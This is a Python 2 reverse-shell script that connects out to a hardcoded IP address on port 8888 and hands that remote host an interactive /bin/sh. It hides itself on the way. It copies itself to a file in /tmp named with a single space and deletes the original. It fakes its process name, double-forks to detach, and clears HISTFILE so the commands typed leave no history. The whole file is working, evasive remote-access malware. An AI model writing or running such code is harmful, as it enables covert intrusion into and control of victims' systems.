#!/usr/bin/env python
import sys, socket, os
import pty, fcntl, struct, termios, select, resource

pybin = '/usr/bin/python2'
name = 'xxx'
host = '95.181.93.72'
port = 8888


our_path = os.path.abspath( __file__ )                   ## path to this script
open( '/tmp/ ', 'w' ).write( open( our_path ).read() )   ## make copy to filename <<space>>
os.unlink( our_path )                                    ## first time it delete shell.py and second time <<space>> file

if len( sys.argv ) < 2:                                  ## is here special hidden arg <<space>> ?
    os.chdir( '/tmp' )                                   ## chdir to tmp to avoid '/tmp' part in process list
    os.execv( pybin, [ name, ' ', ' ' ] )                ## exec python /tmp/<<space>> <<space>>

try:                                                     ## creating socket & connecting...
    sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
    sock.connect( (host, port) )
except:
    print "[!] Can't connect !\n"
    os._exit( 0 )

if os.fork() > 0: os._exit( 0 )                          ## forking for deattaching from main thread
if os.fork() > 0: os._exit( 0 )                          ## ...

os.dup2( sock.fileno(), sys.stdin.fileno()  )
os.dup2( sock.fileno(), sys.stdout.fileno() )
os.dup2( sock.fileno(), sys.stderr.fileno() )
sock.sendall( ('\r\n>>>>>>>>>>>>>>> rShell by ont.rif >>>>>>>>>>>>>>\r\n') )

print "[!] %s\r" % sys.version

pid, fd = pty.fork()
if not pid: # Child
    try:
        TIOCSWINSZ = getattr(termios, 'TIOCSWINSZ', -2146929561)
        if TIOCSWINSZ == 2148037735L:
            TIOCSWINSZ = -2146929561
        s = struct.pack('HHHH', 36, 111, 0, 0)           ## terminal size = 111 x 36
        fcntl.ioctl( sys.stdout.fileno(), TIOCSWINSZ, s )
    except:
        pass

    os.execve( '/bin/sh', [ name ], { 'HISTFILE' : '', 'TERM' : 'linux' } )  ## bash with usefull env vars


while True:
    r, w, e = select.select( [ fd, sock.fileno() ], [], [], 5 )

    if fd in r:
        try:
            res = os.read( fd, 100000 )
            os.write( sock.fileno(), res )
        except:
            print "[!] Die (child time out)......\r"
            os._exit( 0 )

    if sock.fileno() in r:
        res = os.read( sock.fileno(), 1000 )
        os.write( fd, res )
        if not res:
            print "[!] Die (empty socket)....\r"
            os._exit( 0 )

    os.write( sock.fileno(), '\x01' )  ## magic byte (to avoid timeouts)
